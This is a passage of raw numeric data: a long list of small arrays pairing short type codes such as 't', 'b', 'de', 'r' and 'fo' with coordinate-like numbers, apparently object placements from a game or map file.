"s", 0, 50, 236, 1], [1, "s", 2, 39, 247, 1], [1, "s", 2, 51, 235, 1], [1, "s", 2, 60, 243, 1], [1, "s", 2, 36, 240, 1], [1, "s", 2, 43, 254, 1], [1, "s", 1, 42, 254, 1], [1, "t", 1, 38, 233, 0], [1, "t", 2, 35, 235, 0], [1, "t", 4, 33, 228, 0], [1, "t", 4, 33, 245, 0], [1, "t", 4, 43, 235, 0], [1, "t", 5, 45, 249, 0], [1, "t", 5, 41, 253, 0], [1, "b", 1, 20, 227, 0], [1, "b", 1, 14, 240, 0], [1, "t", 3, 21, 227, 0], [1, "t", 3, 27, 234, 0], [1, "t", 3, 15, 241, 0], [1, "t", 3, 12, 229, 0], [1, "t", 4, 17, 224, 0], [1, "t", 4, 11, 231, 0], [1, "t", 4, 22, 238, 0], [1, "t", 4, 11, 239, 0], [1, "t", 1, 22, 243, 0], [1, "b", 2, 23, 242, 0], [1, "s", 1, 23, 238, 1], [1, "s", 1, 22, 228, 1], [1, "s", 2, 24, 228, 1], [1, "s", 2, 21, 236, 1], [1, "s", 0, 13, 228, 1], [1, "s", 0, 16, 242, 1], [1, "s", 1, 15, 244, 1], [1, "s", 1, 34, 236, 1], [1, "t", 1, 26, 249, 0], [1, "t", 1, 22, 256, 0], [1, "t", 2, 23, 255, 0], [1, "b", 1, 17, 256, 0], [1, "b", 2, 18, 256, 0], [1, "s", 0, 21, 252, 1], [1, "s", 2, 20, 250, 1], [1, "s", 2, 23, 259, 1], [1, "s", 1, 13, 257, 1], [1, "t", 1, 31, 254, 0], [1, "t", 2, 32, 254, 0], [1, "t", 4, 28, 254, 0], [1, "t", 4, 34, 258, 0], [1, "t", 0, 29, 260, 0], [1, "b", 2, 30, 261, 0], [1, "t", 0, 43, 262, 0], [1, "t", 2, 42, 263, 0], [1, "t", 4, 46, 264, 0], [1, "b", 1, 39, 265, 0], [1, "b", 1, 58, 267, 0], [1, "t", 2, 57, 268, 0], [1, "t", 4, 62, 270, 0], [1, "t", 5, 52, 273, 0], [1, "s", 1, 52, 269, 1], [1, "s", 1, 41, 272, 1], [1, "s", 2, 41, 274, 1], [1, "t", 2, 42, 268, 0], [1, "t", 0, 43, 268, 0], [1, "b", 1, 46, 272, 0], [1, "b", 1, 14, 265, 0], [1, "t", 2, 15, 266, 0], [1, "t", 4, 19, 264, 0], [1, "t", 4, 29, 263, 0], [1, "t", 4, 11, 269, 0], [1, "t", 1, 29, 271, 0], [1, "b", 2, 28, 272, 0], [1, "t", 2, 24, 267, 0], [1, "t", 2, 20, 279, 0], [1, "t", 0, 19, 278, 0], [1, "t", 3, 13, 278, 0], [1, "b", 0, 21, 284, 0], [1, "b", 0, 18, 289, 0], [1, "t", 2, 20, 283, 0], [1, "t", 2, 19, 290, 0], [1, "t", 4, 19, 283, 0], [1, "t", 4, 20, 290, 0], [1, "s", 1, 16, 285, 1], [1, "s", 1, 24, 288, 1], [1, "s", 2, 26, 287, 1], [1, "s", 2, 16, 278, 1], [1, "s", 1, 21, 268, 1], [1, "s", 2, 19, 268, 1], [1, "t", 0, 12, 294, 0], [1, "b", 1, 13, 295, 0], [1, "t", 3, 13, 291, 0], [1, "t", 3, 10, 299, 0], [1, "t", 4, 11, 287, 0], [1, "t", 4, 17, 298, 0], [1, "t", 1, 27, 294, 0], [1, "b", 2, 26, 295, 0], [1, "t", 3, 33, 297, 0], [1, "b", 1, 48, 278, 0], [1, "b", 0, 46, 280, 0], [1, "b", 2, 50, 280, 0], [1, "t", 0, 44, 282, 0], [1, "b", 1, 49, 283, 0], [1, "b", 0, 51, 278, 0], [1, "b", 3, 50, 279, 0], [1, "b", 3, 44, 284, 0], [1, "b", 0, 47, 284, 0], [1, "b", 2, 42, 283, 0], [1, "t", 4, 51, 277, 0], [1, "b", 1, 44, 286, 0], [1, "b", 2, 46, 286, 0], [1, "b", 1, 42, 285, 0], [1, "b", 3, 41, 286, 0], [1, "t", 5, 42, 287, 0], [1, "b", 1, 42, 278, 0], [1, "b", 2, 43, 279, 0], [1, "b", 0, 40, 280, 0], [1, "t", 4, 39, 283, 0], [1, "t", 4, 39, 279, 0], [1, "t", 5, 43, 277, 0], [1, "t", 5, 47, 287, 0], [1, "t", 4, 46, 277, 0], [1, "t", 4, 45, 290, 0], [1, "t", 4, 36, 285, 0], [1, "t", 3, 35, 284, 0], [1, "t", 3, 36, 272, 0], [1, "t", 4, 35, 271, 0], [1, "t", 1, 29, 279, 0], [1, "b", 1, 32, 277, 0], [1, "t", 3, 31, 278, 0], [1, "b", 2, 28, 280, 0], [1, "t", 4, 29, 286, 0], [1, "t", 5, 28, 275, 0], [1, "t", 3, 37, 292, 0], [1, "b", 1, 36, 291, 0], [1, "b", 0, 34, 298, 0], [1, "t", 4, 31, 292, 0], [1, "t", 4, 46, 295, 0], [1, "t", 4, 59, 287, 0], [1, "b", 1, 58, 286, 0], [1, "s", 1, 68, 284, 1], [1, "s", 2, 70, 286, 1], [1, "s", 0, 67, 284, 1], [1, "t", 3, 66, 283, 0], [1, "t", 1, 65, 282, 0], [1, "b", 1, 64, 288, 0], [1, "t", 3, 60, 293, 0], [1, "t", 1, 61, 294, 0], [1, "b", 1, 76, 294, 0], [1, "t", 5, 75, 295, 0], [1, "t", 5, 56, 293, 0], [1, "t", 5, 59, 281, 0], [1, "t", 5, 67, 291, 0], [1, "b", 0, 88, 293, 0], [1, "t", 2, 89, 292, 0], [1, "t", 2, 85, 286, 0], [1, "t", 4, 88, 289, 0], [1, "t", 4, 79, 287, 0], [1, "b", 1, 84, 285, 0], [1, "t", 3, 75, 284, 0], [1, "b", 0, 75, 278, 0], [1, "t", 3, 74, 277, 0], [1, "t", 4, 81, 276, 0], [1, "t", 2, 65, 276, 0], [1, "b", 1, 66, 275, 0], [1, "g", 0, 45, 261, 1], [1, "g", 1, 39, 258, 1], [1, "g", 0, 35, 250, 1], [1, "g", 2, 22, 247, 1], [1, "g", 2, 27, 227, 1], [1, "g", 2, 63, 218, 1], [1, "g", 1, 56, 224, 1], [1, "g", 0, 46, 231, 1], [1, "g", 1, 65, 240, 1], [1, "g", 2, 67, 238, 1], [1, "g", 2, 79, 232, 1], [1, "g", 2, 72, 253, 1], [1, "g", 2, 62, 264, 1], [1, "g", 2, 28, 267, 1], [1, "g", 2, 58, 274, 1], [1, "de", 2, 14, 182, 0], [1, "de", 2, 24, 182, 0], [1, "de", 0, 11, 185, 0], [1, "de", 0, 14, 194, 0], [1, "de", 1, 25, 196, 0], [1, "de", 3, 31, 183, 0], [1, "de", 0, 38, 181, 0], [1, "de", 2, 45, 186, 0], [1, "de", 1, 38, 191, 0], [1, "de", 0, 56, 181, 0], [1, "de", 1, 68, 182, 0], [1, "de", 2, 80, 181, 0], [1, "de", 3, 86, 187, 0], [1, "de", 0, 84, 193, 0], [1, "de", 1, 82, 201, 0], [1, "de", 2, 64, 191, 0], [1, "de", 2, 72, 200, 0], [1, "de", 3, 64, 201, 0], [1, "de", 2, 76, 209, 0], [1, "de", 3, 71, 212, 0], [1, "de", 1, 86, 214, 0], [1, "de", 0, 57, 208, 0], [1, "de", 0, 41, 203, 0], [1, "de", 1, 15, 206, 0], [1, "de", 2, 25, 209, 0], [1, "de", 3, 16, 218, 0], [1, "de", 3, 11, 227, 0], [1, "de", 0, 22, 229, 0], [1, "de", 1, 15, 239, 0], [1, "de", 2, 24, 238, 0], [1, "de", 3, 22, 246, 0], [1, "de", 3, 10, 253, 0], [1, "de", 1, 18, 258, 0], [1, "de", 1, 28, 261, 0], [1, "de", 1, 14, 267, 0], [1, "de", 0, 24, 268, 0], [1, "de", 0, 15, 278, 0], [1, "de", 2, 21, 279, 0], [1, "de", 2, 30, 272, 0], [1, "de", 2, 29, 281, 0], [1, "de", 2, 15, 284, 0], [1, "de", 3, 12, 291, 0], [1, "de", 3, 30, 287, 0], [1, "de", 3, 27, 293, 0], [1, "de", 0, 25, 296, 0], [1, "de", 0, 11, 298, 0], [1, "de", 0, 8, 286, 0], [1, "de", 2, 36, 299, 0], [1, "de", 2, 37, 280, 0], [1, "de", 3, 38, 291, 0], [1, "de", 1, 48, 287, 0], [1, "de", 1, 46, 277, 0], [1, "de", 1, 53, 278, 0], [1, "de", 3, 48, 295, 0], [1, "de", 0, 57, 294, 0], [1, "de", 1, 65, 290, 0], [1, "de", 1, 84, 292, 0], [1, "de", 2, 77, 295, 0], [1, "de", 2, 84, 287, 0], [1, "de", 0, 74, 279, 0], [1, "de", 3, 65, 274, 0], [1, "de", 2, 71, 267, 0], [1, "de", 2, 65, 261, 0], [1, "de", 2, 47, 264, 0], [1, "de", 3, 47, 258, 0], [1, "de", 3, 53, 251, 0], [1, "de", 2, 40, 253, 0], [1, "de", 0, 35, 244, 0], [1, "de", 0, 37, 233, 0], [1, "de", 3, 44, 226, 0], [1, "de", 2, 37, 219, 0], [1, "de", 2, 54, 234, 0], [1, "de", 1, 66, 234, 0], [1, "de", 2, 65, 241, 0], [1, "de", 0, 68, 249, 0], [1, "de", 3, 78, 257, 0], [1, "de", 2, 86, 253, 0], [1, "de", 2, 83, 245, 0], [1, "de", 1, 82, 238, 0], [1, "de", 3, 76, 235, 0], [1, "de", 2, 86, 232, 0], [1, "de", 0, 86, 224, 0], [1, "de", 2, 76, 226, 0], [1, "de", 2, 61, 228, 0], [1, "de", 2, 58, 217, 0], [1, "de", 0, 49, 217, 0], [1, "de", 19, 11, 179, 0], [1, "de", 20, 17, 180, 0], [1, "de", 22, 18, 181, 0], [1, "de", 19, 30, 184, 0], [1, "de", 19, 27, 187, 0], [1, "de", 19, 30, 195, 0], [1, "de", 19, 18, 192, 0], [1, "de", 19, 44, 182, 0], [1, "de", 19, 49, 182, 0], [1, "de", 19, 54, 182, 0], [1, "de", 19, 59, 183, 0], [1, "de", 19, 56, 186, 0], [1, "de", 19, 46, 188, 0], [1, "de", 19, 58, 193, 0], [1, "de", 19, 67, 187, 0], [1, "de", 19, 65, 192, 0], [1, "de", 19, 71, 180, 0], [1, "de", 19, 78, 187, 0], [1, "de", 19, 80, 194, 0], [1, "de", 19, 72, 193, 0], [1, "de", 19, 82, 182, 0], [1, "de", 19, 88, 185, 0], [1, "de", 19, 87, 189, 0], [1, "de", 19, 86, 197, 0], [1, "de", 19, 85, 203, 0], [1, "de", 19, 74, 200, 0], [1, "de", 19, 70, 202, 0], [1, "de", 19, 83, 199, 0], [1, "de", 19, 86, 208, 0], [1, "de", 19, 84, 214, 0], [1, "de", 19, 83, 211, 0], [1, "de", 19, 84, 217, 0], [1, "de", 19, 77, 210, 0], [1, "de", 19, 71, 210, 0], [1, "de", 19, 73, 213, 0], [1, "de", 19, 66, 207, 0], [1, "de", 19, 66, 204, 0], [1, "de", 19, 62, 209, 0], [1, "de", 19, 63, 201, 0], [1, "de", 19, 56, 205, 0], [1, "de", 19, 49, 199, 0], [1, "de", 19, 50, 205, 0], [1, "de", 19, 40, 197, 0], [1, "de", 19, 38, 198, 0], [1, "de", 19, 40, 208, 0], [1, "de", 19, 36, 204, 0], [1, "de", 19, 33, 204, 0], [1, "de", 19, 29, 202, 0], [1, "de", 19, 27, 200, 0], [1, "de", 19, 26, 193, 0], [1, "de", 19, 18, 201, 0], [1, "de", 19, 20, 199, 0], [1, "de", 19, 12, 196, 0], [1, "de", 19, 12, 204, 0], [1, "de", 19, 11, 201, 0], [1, "de", 19, 23, 208, 0], [1, "de", 19, 31, 214, 0], [1, "de", 19, 26, 215, 0], [1, "de", 19, 36, 217, 0], [1, "de", 19, 32, 223, 0], [1, "de", 19, 26, 223, 0], [1, "de", 19, 18, 218, 0], [1, "de", 19, 15, 215, 0], [1, "de", 19, 17, 212, 0], [1, "de", 19, 15, 224, 0], [1, "de", 19, 19, 229, 0], [1, "de", 19, 10, 230, 0], [1, "de", 19, 22, 240, 0], [1, "de", 19, 13, 238, 0], [1, "de", 19, 13, 243, 0], [1, "de", 19, 24, 244, 0], [1, "de", 19, 24, 250, 0], [1, "de", 19, 28, 253, 0], [1, "de", 19, 33, 255, 0], [1, "de", 19, 34, 260, 0], [1, "de", 19, 31, 260, 0], [1, "de", 19, 38, 267, 0], [1, "de", 19, 44, 264, 0], [1, "de", 19, 43, 261, 0], [1, "de", 19, 16, 257, 0], [1, "de", 19, 22, 258, 0], [1, "de", 19, 12, 253, 0], [1, "de", 19, 8, 242, 0], [1, "de", 19, 8, 255, 0], [1, "de", 19, 15, 264, 0], [1, "de", 19, 20, 265, 0], [1, "de", 19, 12, 271, 0], [1, "de", 19, 8, 272, 0], [1, "de", 19, 13, 277, 0], [1, "de", 19, 21, 277, 0], [1, "de", 19, 21, 281, 0], [1, "de", 19, 27, 282, 0], [1, "de", 19, 29, 278, 0], [1, "de", 19, 29, 273, 0], [1, "de", 19, 36, 271, 0], [1, "de", 19, 8, 278, 0], [1, "de", 19, 11, 286, 0], [1, "de", 19, 17, 291, 0], [1, "de", 19, 14, 294, 0], [1, "de", 19, 8, 292, 0], [1, "de", 19, 12, 300, 0], [1, "de", 19, 18, 298, 0], [1, "de", 19, 16, 301, 0], [1, "de", 19, 27, 296, 0], [1, "de", 19, 25, 292, 0], [1, "de", 19, 23, 301, 0], [1, "de", 19, 28, 301, 0], [1, "de", 19, 35, 297, 0], [1, "de", 19, 37, 301, 0], [1, "de", 19, 43, 301, 0], [1, "de", 19, 46, 294, 0], [1, "de", 19, 46, 288, 0], [1, "de", 19, 40, 287, 0], [1, "de", 19, 50, 301, 0], [1, "de", 19, 58, 301, 0], [1, "de", 19, 64, 301, 0], [1, "de", 19, 71, 301, 0], [1, "de", 19, 80, 301, 0], [1, "de", 19, 87, 301, 0], [1, "de", 19, 86, 294, 0], [1, "de", 19, 87, 290, 0], [1, "de", 19, 82, 286, 0], [1, "de", 19, 75, 285, 0], [1, "de", 19, 66, 292, 0], [1, "de", 19, 66, 288, 0], [1, "de", 19, 58, 288, 0], [1, "de", 19, 67, 282, 0], [1, "de", 19, 61, 281, 0], [1, "de", 19, 60, 295, 0], [1, "de", 19, 50, 282, 0], [1, "de", 19, 47, 283, 0], [1, "de", 19, 48, 281, 0], [1, "de", 19, 44, 277, 0], [1, "de", 19, 41, 282, 0], [1, "de", 19, 38, 281, 0], [1, "de", 19, 42, 288, 0], [1, "de", 19, 52, 281, 0], [1, "de", 19, 50, 275, 0], [1, "de", 19, 39, 277, 0], [1, "de", 19, 38, 284, 0], [1, "de", 19, 51, 285, 0], [1, "de", 19, 38, 278, 0], [1, "de", 19, 47, 272, 0], [1, "de", 19, 44, 267, 0], [1, "de", 19, 76, 280, 0], [1, "de", 19, 78, 272, 0], [1, "de", 19, 68, 275, 0], [1, "de", 19, 70, 265, 0], [1, "de", 19, 65, 263, 0], [1, "de", 19, 64, 262, 0], [1, "de", 19, 60, 268, 0], [1, "de", 19, 56, 266, 0], [1, "de", 19, 55, 260, 0], [1, "de", 19, 59, 258, 0], [1, "de", 19, 62, 255, 0], [1, "de", 19, 67, 253, 0], [1, "de", 19, 69, 256, 0], [1, "de", 19, 44, 253, 0], [1, "de", 19, 44, 250, 0], [1, "de", 19, 36, 245, 0], [1, "de", 19, 39, 239, 0], [1, "de", 19, 42, 234, 0], [1, "de", 19, 37, 235, 0], [1, "de", 19, 45, 226, 0], [1, "de", 19, 46, 222, 0], [1, "de", 19, 51, 218, 0], [1, "de", 19, 68, 218, 0], [1, "de", 19, 74, 224, 0], [1, "de", 19, 76, 218, 0], [1, "de", 19, 84, 221, 0], [1, "de", 19, 88, 223, 0], [1, "de", 19, 76, 230, 0], [1, "de", 19, 86, 234, 0], [1, "de", 19, 79, 237, 0], [1, "de", 19, 75, 243, 0], [1, "de", 19, 81, 245, 0], [1, "de", 19, 83, 247, 0], [1, "de", 19, 88, 247, 0], [1, "de", 19, 84, 254, 0], [1, "de", 19, 86, 251, 0], [1, "de", 19, 85, 260, 0], [1, "de", 19, 79, 260, 0], [1, "de", 19, 76, 251, 0], [1, "de", 19, 72, 251, 0], [1, "de", 19, 69, 251, 0], [1, "de", 19, 87, 266, 0], [1, "de", 19, 89, 270, 0], [1, "de", 19, 87, 271, 0], [1, "de", 19, 82, 277, 0], [1, "de", 19, 87, 284, 0], [1, "de", 19, 87, 237, 0], [1, "de", 19, 88, 179, 0], [1, "de", 19, 50, 191, 0], [1, "de", 19, 52, 221, 0], [1, "de", 19, 34, 234, 0], [1, "de", 19, 27, 233, 0], [1, "de", 19, 37, 293, 0], [1, "de", 29, 13, 181, 0], [1, "de", 29, 8, 180, 0], [1, "de", 30, 13, 186, 0], [1, "de", 31, 24, 183, 0], [1, "de", 32, 33, 185, 0], [1, "de", 32, 37, 182, 0], [1, "de", 29, 45, 183, 0], [1, "de", 30, 48, 183, 0], [1, "de", 30, 58, 181, 0], [1, "de", 30, 66, 188, 0], [1, "de", 30, 66, 182, 0], [1, "de", 29, 63, 196, 0], [1, "de", 29, 54, 194, 0], [1, "de", 30, 79, 189, 0], [1, "de", 30, 87, 182, 0], [1, "de", 30, 83, 185, 0], [1, "de", 29, 88, 189, 0], [1, "de", 29, 85, 202, 0], [1, "de", 31, 82, 203, 0], [1, "de", 32, 80, 201, 0], [1, "de", 32, 87, 209, 0], [1, "de", 32, 83, 214, 0], [1, "de", 30, 88, 220, 0], [1, "de", 30, 78, 229, 0], [1, "de", 30, 73, 223, 0], [1, "de", 29, 74, 217, 0], [1, "de", 29, 67, 217, 0], [1, "de", 30, 72, 208, 0], [1, "de", 30, 73, 199, 0], [1, "de", 30, 65, 207, 0], [1, "de", 29, 63, 210, 0], [1, "de", 29, 50, 204, 0], [1, "de", 30, 41, 205, 0], [1, "de", 29, 35, 205, 0], [1, "de", 30, 27, 202, 0], [1, "de", 30, 20, 201, 0], [1, "de", 29, 10, 203, 0], [1, "de", 29, 14, 196, 0], [1, "de", 29, 24, 187, 0], [1, "de", 29, 28, 223, 0], [1, "de", 29, 32, 212, 0], [1, "de", 30, 28, 214, 0], [1, "de", 31, 24, 218, 0], [1, "de", 29, 36, 219, 0], [1, "de", 29, 37, 217, 0], [1, "de", 29, 52, 217, 0], [1, "de", 29, 59, 217, 0], [1, "de", 29, 69, 231, 0], [1, "de", 29, 64, 242, 0], [1, "de", 30, 53, 253, 0], [1, "de", 30, 45, 250, 0], [1, "de", 30, 58, 261, 0], [1, "de", 30, 73, 276, 0], [1, "de", 30, 64, 276, 0], [1, "de", 30, 82, 285, 0], [1, "de", 30, 65, 293, 0], [1, "de", 30, 56, 288, 0], [1, "de", 30, 45, 296, 0], [1, "de", 30, 40, 288, 0], [1, "de", 30, 37, 283, 0], [1, "de", 30, 53, 280, 0], [1, "de", 30, 41, 277, 0], [1, "de", 29, 28, 296, 0], [1, "de", 29, 18, 292, 0], [1, "de", 29, 24, 284, 0], [1, "de", 30, 10, 295, 0], [1, "de", 30, 10, 286, 0], [1, "de", 30, 15, 279, 0], [1, "de", 30, 15, 269, 0], [1, "de", 30, 21, 259, 0], [1, "de", 30, 12, 256, 0], [1, "de", 30, 31, 245, 0], [1, "de", 30, 12, 240, 0], [1, "de", 30, 28, 235, 0], [1, "de", 30, 13, 226, 0], [1, "de", 30, 39, 231, 0], [1, "de", 30, 61, 226, 0], [1, "r", 96, 262, 0], [1, "r", 97, 262, 0], [1, "r", 98, 262, 0], [1, "r", 97, 270, 0], [1, "r", 97, 271, 0], [1, "r", 97, 272, 0], [1, "r", 97, 273, 0], [1, "r", 97, 274, 0], [1, "r", 97, 275, 0], [1, "r", 97, 276, 0], [1, "r", 97, 277, 0], [1, "r", 97, 278, 0], [1, "r", 98, 270, 0], [1, "r", 98, 271, 0], [1, "r", 98, 272, 0], [1, "r", 98, 273, 0], [1, "r", 98, 274, 0], [1, "r", 98, 275, 0], [1, "r", 98, 276, 0], [1, "r", 98, 277, 0], [1, "r", 98, 278, 0], [1, "r", 96, 283, 0], [1, "r", 97, 283, 0], [1, "r", 97, 284, 0], [1, "r", 97, 285, 0], [1, "r", 98, 283, 0], [1, "r", 98, 284, 0], [1, "r", 98, 285, 0], [1, "r", 96, 270, 0], [1, "r", 96, 271, 0], [1, "r", 96, 272, 0], [1, "r", 96, 273, 0], [1, "r", 96, 274, 0], [1, "r", 96, 275, 0], [1, "r", 96, 276, 0], [1, "r", 96, 277, 0], [1, "r", 96, 278, 0], [1, "r", 44, 248, 0], [1, "de", 16, 94, 290, 0], [1, "de", 16, 94, 252, 0], [1, "de", 16, 94, 228, 0], [1, "de", 17, 94, 200, 0], [1, "r", 95, 282, 1], [1, "r", 95, 281, 1], [1, "r", 94, 281, 1], [1, "r", 90, 281, 1], [1, "r", 91, 282, 1], [1, "r", 89, 281, 1], [1, "r", 85, 276, 1], [1, "r", 85, 277, 1], [1, "r", 86, 278, 1], [1, "p", 0, 85, 279, 1], [1, "r", 86, 279, 1], [1, "r", 87, 280, 1], [1, "r", 96, 281, 0], [1, "r", 97, 281, 0], [1, "r", 98, 281, 0], [1, "r", 98, 282, 0], [1, "r", 97, 282, 0], [1, "r", 96, 282, 0], [1, "r", 68, 261, 1], [1, "fo", 1, 94, 168, 0], [1, "fo", 2, 94, 151, 0], [1, "fo", 1, 94, 138, 0], [1, "fo", 1, 93, 124, 0], [1, "fo", 1, 94, 129, 0], [1, "fo", 1, 93, 113, 0], [1, "fo", 1, 94, 102, 0], [1, "fo", 1, 94, 93, 0], [1, "fo", 1, 93, 90, 0], [1, "fo", 1, 94, 79, 0], [1, "fo", 1, 94, 76, 0], [1, "fo", 1, 93, 70, 0], [1, "fo", 1, 93, 63, 0], [1, "fo", 1, 94, 53, 0], [1, "fo", 1, 93, 10, 0], [1, "fo", 1, 85, 8, 0], [1, "fo", 1, 94, 12, 0], [1, "fo", 1, 66, 13, 0], [1, "fo", 1, 69, 9, 0], [1, "fo", 2, 68, 14, 0], [1, "fo", 2, 66, 25, 0], [1, "fo", 2, 92, 9, 0], [1, "fo", 2, 94, 14, 0], [1, "fo", 2, 87, 9, 0], [1, "fo", 2, 71, 9, 0], [1, "fo", 2, 90, 12, 0], [1, "fo", 2, 91, 13, 0], [1, "fo", 1, 74, 12, 0], [1, "fo", 2, 72, 12, 0], [1, "fo", 2, 75, 13, 0], [1, "fo", 2, 74, 15, 0], [1, "fo", 2, 84, 12, 0], [1, "fo", 2, 81, 14, 0], [1, "fo", 1, 84, 13, 0], [1, "fo", 1, 84, 19, 0], [1, "fo", 1, 11, 9, 0], [1, "fo", 1, 7, 14, 0], [1, "fo", 1, 8, 22, 0], [1, "fo", 1, 7, 34, 0], [1, "fo", 1, 12, 24, 0], [1, "fo", 2, 8, 24, 0], [1, "fo", 2, 9, 21, 0], [1, "fo", 2, 31, 10, 0], [1, "fo", 2, 33, 27, 0], [1, "fo", 2, 9, 34, 0], [1, "fo", 2, 8, 19, 0], [1, "fo", 1, 14, 10, 0], [1, "fo", 2, 13, 9, 0], [1, "fo", 2, 15, 11, 0], [1, "fo", 2, 9, 9, 0], [1, "fo", 2, 9, 10, 0], [1, "fo", 2, 9, 15, 0], [1, "fo", 2, 10, 23, 0], [1, "fo", 2, 34, 29, 0], [1, "fo", 2, 27, 18, 0], [1, "fo", 2, 25, 21, 0], [1, "fo", 2, 20, 18, 0], [1, "fo", 2, 18, 21, 0], [1, "fo", 2, 29, 9, 0], [1, "fo", 2, 13, 14, 0], [1, "fo", 2, 9, 38, 0], [1, "fo", 2, 21, 39, 0], [1, "fo", 2, 84, 26, 0], [1, "fo", 2, 77, 25, 0], [1, "fo", 2, 86, 35, 0], [1, "fo", 1, 70, 35, 0], [1, "fo", 2, 72, 36, 0], [1, "fo", 2, 73, 31, 0], [1, "fo", 2, 89, 39, 0], [1, "fo", 2, 65, 40, 0], [1, "fo", 2, 92, 32, 0], [1, "fo", 2, 90, 28, 0], [1, "de", 22, 25, 266, 0], [1, "de", 22, 17, 206, 0], [1, "de", 19, 8, 184, 0], [1, "de", 19, 22, 183, 0], [1, "de", 19, 35, 188, 0], [1, "de", 19, 36, 192, 0], [1, "de", 19, 50, 277, 0], [1, "de", 19, 35, 279, 0], [1, "t", 4, 7, 178, 0], [1, "t", 1, 7, 179, 0], [1, "t", 3, 7, 180, 0], [1, "t", 2, 7, 181, 0], [1, "t", 5, 7, 182, 0], [1, "t", 4, 7, 183, 0], [1, "t", 3, 7, 184, 0], [1, "t", 4, 7, 185, 0], [1, "t", 2, 7, 186, 0], [1, "t", 1, 7, 187, 0], [1, "t", 4, 7, 188, 0], [1, "t", 3, 7, 189, 0], [1, "t", 5, 7, 190, 0], [1, "t", 1, 7, 191, 0], [1, "t", 3, 7, 192, 0], [1, "t", 4, 7, 193, 0], [1, "t", 3, 7, 194, 0], [1, "t", 5, 7, 195, 0], [1, "t", 2, 7, 196, 0], [1, "t", 4, 7, 197, 0], [1, "b", 2, 7, 198, 0], [1, "t", 4, 7, 199, 0], [1, "t", 2, 7, 200, 0], [1, "t", 5, 7, 201, 0], [1, "t", 2, 7, 202, 0], [1, "t", 4, 7, 203, 0], [1, "t", 2, 7, 204, 0], [1, "t", 5, 7, 205, 0], [1, "t", 2, 7, 206, 0], [1, "t", 1, 7, 207, 0], [1, "t", 4, 7, 208, 0], [1, "t", 3, 7, 209, 0], [1, "t", 1, 7, 210, 0], [1, "b", 0, 7, 211, 0], [1, "t", 3, 7, 212, 0], [1, "t", 4, 7, 213, 0], [1, "t", 3, 7, 214, 0], [1, "t", 5, 7, 215, 0], [1, "t", 5, 7, 216, 0], [1, "t", 3, 7, 217, 0], [1, "t", 1, 7, 218, 0], [1, "t", 4, 7, 219, 0], [1, "b", 2, 7, 220, 0], [1, "t", 1, 7, 221, 0], [1, "t", 2, 7, 222, 0], [1, "t", 4, 7, 223, 0], [1, "t", 3, 7, 224, 0], [1, "t", 1, 7, 225, 0], [1, "t", 4, 7, 226, 0], [1, "t", 2, 7, 227, 0], [1, "t", 5, 7, 228, 0], [1, "t", 3, 7, 229, 0], [1, "t", 1, 7, 230, 0], [1, "t", 4, 7, 231, 0], [1, "b", 2, 7, 232, 0], [1, "t", 5, 7, 233, 0], [1, "t", 1, 7, 234, 0], [1, "t", 3, 7, 235, 0], [1, "t", 4, 7, 236, 0], [1, "t", 2, 7, 237, 0], [1, "t", 5, 7, 238, 0], [1, "b", 3, 7, 239, 0], [1, "t", 2, 7, 240, 0], [1, "t", 1, 7, 241, 0], [1, "t", 2, 7, 242, 0], [1, "t", 4, 7, 243, 0], [1, "t", 3, 7, 244, 0], [1, "t", 4, 7, 245, 0], [1, "t", 1, 7, 246, 0], [1, "b", 0, 7, 247, 0], [1, "t", 3, 7, 248, 0], [1, "t", 5, 7, 249, 0], [1, "t", 2, 7, 250, 0], [1, "t", 1, 7, 251, 0], [1, "t", 4, 7, 252, 0], [1, "t", 3, 7, 253, 0], [1, "t", 5, 7, 254, 0], [1, "t", 1, 7, 255, 0], [1, "t", 4, 7, 256, 0], [1, "t", 1, 7, 257, 0], [1, "t", 2, 7, 258, 0], [1, "t", 5, 7, 260, 0], [1, "t", 3, 7, 259, 0], [1, "t", 1, 7, 261, 0], [1, "t", 3, 7, 262, 0], [1, "t", 4, 7, 263, 0], [1, "t", 1, 7, 264, 0], [1, "t", 2, 7, 265, 0], [1, "t", 5, 7, 266, 0], [1, "t", 2, 7, 267, 0], [1, "t", 2, 7, 269, 0], [1, "b", 2, 7, 268, 0], [1, "t", 4, 7, 270, 0], [1, "t", 1, 7, 271, 0], [1, "t", 5, 7, 272, 0], [1, "b", 2, 7, 273, 0], [1, "t", 4, 7, 274, 0], [1, "t", 2, 7, 275, 0], [1, "t", 5, 7, 276, 0], [1, "t", 5, 7, 277, 0], [1, "t", 2, 7, 278, 0], [1, "t", 1, 7, 279, 0], [1, "t", 4, 7, 280, 0], [1, "b", 1, 7, 281, 0], [1, "t", 3, 7, 282, 0], [1, "t", 4, 7, 283, 0], [1, "t", 1, 7, 284, 0], [1, "t", 3, 7, 285, 0], [1, "t", 5, 7, 286, 0], [1, "t", 4, 7, 288, 0], [1, "t", 2, 7, 287, 0], [1, "b", 0, 7, 289, 0], [1, "t", 4, 7, 290, 0], [1, "t", 2, 7, 291, 0], [1, "t", 5, 7, 292, 0], [1, "t", 3, 7, 293, 0], [1, "t", 1, 7, 294, 0], [1, "t", 4, 7, 295, 0], [1, "t", 3, 7, 296, 0], [1, "t", 1, 7, 297, 0], [1, "t", 4, 7, 298, 0], [1, "t", 2, 7, 299, 0], [1, "b", 0, 7, 300, 0], [1, "t", 2, 7, 301, 0], [1, "r", 196, 271, 0], [1, "r", 199, 274, 0], [1, "r", 167, 238, 0], [1, "r", 171, 240, 0], [1, "r", 189, 207, 0], [1, "r", 192, 209, 0], [1, "r", 198, 271, 0], [1, "r", 197, 271, 0], [1, "r", 198, 272, 0], [1, "r", 197, 272, 0], [1, "r", 196, 272, 0], [1, "r", 195, 272, 0], [1, "r", 199, 272, 0], [1, "r", 199, 273, 0], [1, "r", 198, 273, 0], [1, "r", 197, 273, 0], [1, "r", 196, 273, 0], [1, "r", 198, 274, 0], [1, "r", 197, 274, 0], [1, "r", 195, 273, 0], [1, "r", 196, 274, 0], [1, "r", 198, 275, 0], [1, "r", 197, 275, 0], [1, "r", 200, 274, 0], [1, "r", 200, 273, 0], [1, "r", 199, 275, 0], [1, "plm", 2, 200, 272, 0], [1, "plm", 1, 195, 271, 0], [1, "plm", 0, 199, 268, 0], [1, "plm", 0, 193, 277, 0], [1, "plm", 1, 199, 276, 0], [1, "s", 1, 200, 275, 1], [1, "s", 1, 194, 272, 1], [1, "s", 2, 193, 270, 1], [1, "g", 2, 193, 273, 1], [1, "g", 2, 201, 267, 1], [1, "m", 2, 220, 298, 1], [1, "m", 1, 219, 292, 1], [1, "m", 1, 214, 297, 1], [1, "r", 168, 238, 0], [1, "r", 169, 238, 0], [1, 